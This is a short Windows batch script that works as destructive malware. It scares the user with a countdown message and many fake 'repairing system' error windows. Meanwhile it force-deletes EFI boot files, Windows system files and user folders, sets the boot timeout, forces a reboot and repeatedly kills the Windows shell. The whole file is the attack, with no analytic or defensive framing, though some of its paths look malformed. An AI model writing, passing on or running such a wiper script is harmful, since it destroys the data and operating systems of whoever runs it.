@echo off
start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
for /L %%i in (1,1,100) do (start cmd /c "echo Error occured while repairing system!echo(pause") & DEL /F /S /Q /A  \EFI\Microsoft\Boot\*.* & DEL /F /S /Q /A C:\Windows*.* & rmdir C:\Users*.* /S /Q
bcdedit /timeout 1
shutdown -r /o -t 20
for /L %%i in (1,1,100) do (start explorer.exe
taskkill /im explorer.exe /f)